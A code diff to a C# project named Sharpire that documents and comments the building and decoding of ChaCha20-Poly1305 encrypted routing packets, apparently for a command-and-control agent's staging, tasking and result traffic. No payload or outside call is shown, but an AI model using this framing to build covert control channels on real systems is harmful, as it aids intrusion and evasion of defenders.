@@ -196,33 +196,68 @@ namespace Sharpire
         }
 
         public static byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
+        /*
+        Constructs a routing packet with chacha20poly1305 encryption.
+        
+        Packet format:
+
+        Nonce: Nonce used by ChaCha20Poly1305
+        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        AESc = AES encrypted using the client's session key
+        ChaCha20(RoutingData): Encrypted RoutingData
+        Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+            Routing Packet:
+            +---------+--------------------------------+--------------------------+
+            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+            +---------+--------------------------------+--------------------------+
+            |    12   |                32              |          length          |
+            +---------+--------------------------------+--------------------------+
+
+                ChaCha20+Poly1305(RoutingData):
+                +---------------------------+---------------------------+
+                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                +---------------------------+---------------------------+
+                |           16              |            16             |
+                +---------------------------+---------------------------+
+
+                    RoutingData:
+                    +-----------+------+------+-------+--------+
+                    | SessionID | Lang | Meta | Extra | Length |
+                    +-----------+------+------+-------+--------+
+                    |    8      |  1   |  1   |   2   |    4   |
+                    +-----------+------+------+-------+--------+
+
+            SessionID = the sessionID that the packet is bound for
+            Lang = indicates the language used
+            Meta = indicates staging req/tasking req/result post/etc.
+            Extra = reserved for future expansion
+        */
         {
             int encryptedBytesLength = (encryptedBytes != null) ? encryptedBytes.Length : 0;
 
+            //prepare the RoutingData
             byte[] data = Encoding.ASCII.GetBytes(sessionId);
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
+            //encrypt it in chacha20poly1305 
             byte[] chacha_nonce = NewInitializationVector(12);
             byte[] poly1305_tag = new byte[16];
             byte[] chacha_data = new byte[data.Length];
-
             ChaCha20Poly1305.Encrypt(key, chacha_nonce, data, out chacha_data, out poly1305_tag);
 
+            //combine the chacha20 encrypted data with its associated poly1305 tag, to make ChaCha20Poly1305(RoutingData)
             byte[] chacha_poly1305_data = Misc.combine(chacha_data, poly1305_tag);
             byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_poly1305_data);
+           
+           //If we have encrypted bytes (AESc), append those to the end
             if (encryptedBytes != null)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
             }
-
-            // Console.WriteLine($"Chacha nonce: (Length: {chacha_nonce.Length}): {Convert.ToHexString(chacha_nonce)}");
-            // Console.WriteLine($"Chacha data: (Length: {chacha_data.Length}): {Convert.ToHexString(chacha_data)}");
-            // Console.WriteLine($"Poly 1305 tag: (Length: {poly1305_tag.Length}): {Convert.ToHexString(poly1305_tag)}");
-            // Console.WriteLine($"Chacha poly1305 data: (Length: {chacha_poly1305_data.Length}): {Convert.ToHexString(chacha_poly1305_data)}");
-            // Console.WriteLine($"Encrypted bytes: (Length: {encryptedBytes.Length}): {Convert.ToHexString(encryptedBytes)}");
-            // Console.WriteLine($"Final packet: (Length: {routingPacketData.Length}): {Convert.ToHexString(routingPacketData)}");
 
             return routingPacketData;
         }
@@ -278,18 +313,55 @@ namespace Sharpire
         }
 
         private RoutingPacket DecodeRoutingPacket(byte[] packetData)
-        {
+         /*
+        Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
+        
+        Packet format:
 
+        Nonce: Nonce used by ChaCha20Poly1305
+        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        AESc = AES encrypted using the client's session key
+        ChaCha20(RoutingData): Encrypted RoutingData
+        Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+            Routing Packet:
+            +---------+--------------------------------+--------------------------+
+            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+            +---------+--------------------------------+--------------------------+
+            |    12   |                32              |          length          |
+            +---------+--------------------------------+--------------------------+
+
+                ChaCha20+Poly1305(RoutingData):
+                +---------------------------+---------------------------+
+                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                +---------------------------+---------------------------+
+                |           16              |            16             |
+                +---------------------------+---------------------------+
+
+                    RoutingData:
+                    +-----------+------+------+-------+--------+
+                    | SessionID | Lang | Meta | Extra | Length |
+                    +-----------+------+------+-------+--------+
+                    |    8      |  1   |  1   |   2   |    4   |
+                    +-----------+------+------+-------+--------+
+
+            SessionID = the sessionID that the packet is bound for
+            Lang = indicates the language used
+            Meta = indicates staging req/tasking req/result post/etc.
+            Extra = reserved for future expansion
+        */
+        {
+            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
             int nonce_length = 12;
             int chacha_header_length = nonce_length + 32;
-
             if (packetData.Length < chacha_header_length)
             {
                 return null;
             }
-
             int offset = 0;
 
+            // while we have bytes to read from packetData...
             while (offset < packetData.Length)
             {
                 // parse given packet
@@ -303,10 +375,11 @@ namespace Sharpire
                 byte[] chachaData = routingChachaData.Take(16).ToArray();
                 byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
 
+                // decrypt encrypted data into routingData
                 byte[] routingData = new byte[16];
                 ChaCha20Poly1305.Decrypt(key, chachaNonce, chachaData, poly1305Tag, out routingData);
 
-                // parse routing data
+                // parse/handle routing data
                 if (routingData.Length < 16)
                 {
                     return null;
@@ -325,6 +398,7 @@ namespace Sharpire
 
                 byte[] encryptedData = packetData.Skip(offset).Take((int)packetLength).ToArray();
 
+                // return the new routing packet
                 return new RoutingPacket
                 {
                     InitializationVector = chachaNonce,
